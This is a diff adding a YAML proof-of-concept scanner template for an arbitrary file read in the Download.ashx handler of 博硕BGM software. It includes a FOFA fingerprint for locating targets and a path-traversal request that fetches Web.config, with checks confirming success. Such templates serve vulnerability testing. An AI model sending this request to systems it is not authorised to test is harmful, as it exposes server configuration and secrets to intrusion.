@@ -1,0 +1,15 @@
+id: poc-yaml-bosure-bgm-download-ashx-anyfile-read
+info:
+  name: 博硕BGM Download.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 博硕BGM
+  fofa: body="Libs/Platform.lib"
+requests:
+- method: GET
+  path: /WebUpload/Download.ashx?fname=&path=/../Web.config
+  expression: status_code == 200 && contains(body,"</system.web>") && contains(body,"<configuration>")
+    && contains(headers,"FileName=Web.config") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
